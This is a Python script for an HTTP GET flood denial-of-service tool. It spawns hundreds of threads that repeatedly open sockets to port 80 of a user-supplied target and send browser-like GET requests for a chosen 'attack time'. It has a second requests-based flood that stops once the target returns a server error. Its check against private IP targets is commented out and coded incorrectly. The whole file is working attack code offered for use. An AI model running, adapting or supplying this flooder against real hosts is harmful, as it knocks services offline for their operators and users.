import threading
import argparse
import requests
import socket
import random
import time


start_time = 0
end_time = 60
flag = 0
cnt = 0

USER_AGENT_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
    'test'
]

ACCEPT_LIST = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
]

def valid_target(target: str) -> bool:
    if target.split('.')[0] == '10':
        raise "Private IP network"
    elif target.split('.')[0] == '172' and (16 <= int(target.split('.')[1]) and int(target.split('.')[1] <= 31)):
        raise "Private IP network"
    elif target.split('.')[0] == '192' and target.split('.')[1] == '168':
        raise "Private IP network"
    else:
        return True


def tick():
    global start_time
    global end_time
    global flag

    while True:
        if end_time <= (time.time() - start_time):
            flag = 1
            print('----- Time End -----')
            exit(0)


def counter():
    global flag
    global cnt

    while flag != 1:
        print(f'send packet: {cnt}')
        time.sleep(5)


def requests_get_flood(target: str) -> None:
    global flag

    while flag != 1:
        res = requests.get(f'http://{target}')

        if res.status_code == 500:
            flag = 1
            print('----- Attack Finish -----')
            exit(0)


def socket_get_flood(target: str) -> None:
    global flag
    global cnt

    while flag != 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, int(80)))

        request = 'GET / HTTP/1.1\r\n' 
        request += 'HOST: ' + target + '\r\n'
        request += 'Connection: keep-alive\r\n'
        request += 'Cache-Control: max-age=0\r\n'
        request += 'User-Agent: ' + random.choice(USER_AGENT_LIST) + '\r\n'
        request += 'Accept: ' + ACCEPT_LIST[0] + '\r\n'
        request += 'Accept-Encoding: gzip, deflate\r\n'
        request += 'Accept-Language: ko,en;q=0.9,en-US;q=0.8\r\n'
        request += '\r\n'

        sock.send(str.encode(request))
        cnt += 1

        sock.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', help='target url', required=True)
    parser.add_argument('-t', help='thread count', type=int, default=500, required=False)
    parser.add_argument('-s', help='attack time',  type=int, default=60, required=False)

    args_p = parser.parse_args()

    '''
    valid = valid_target(args_p.u)
    if not valid:
        exit()
    '''

    end_time = args_p.s

    start_time = time.time()
    st = threading.Thread(target=tick, args=())
    st.start()

    ct = threading.Thread(target=counter, args=())
    ct.start()

    for _ in range(args_p.t):
        t = threading.Thread(target=socket_get_flood, args=(args_p.u,))
        t.start()   
